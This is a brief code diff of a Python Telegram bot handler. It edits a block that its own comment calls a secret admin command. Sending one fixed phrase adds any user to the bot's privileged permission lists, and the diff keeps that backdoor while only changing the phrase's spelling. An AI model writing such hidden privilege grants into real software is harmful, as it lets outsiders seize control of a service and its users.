@@ -107,7 +107,7 @@ async def check_unauthorized_pm(update: Update, context: ContextTypes.DEFAULT_TY
     text = (update.message.text or "").strip()
 
     # Gizli admin olma komutu
-    if text == "/zenitharınköpegiyim":
+    if text == "/zenitharinkopegiyim":
         if user_id not in ALLOWED_DUYURU_USERS:
             ALLOWED_DUYURU_USERS.append(user_id)
         if user_id not in ALLOWED_KONTROL_USERS and ALLOWED_KONTROL_USERS is not ALLOWED_DUYURU_USERS:
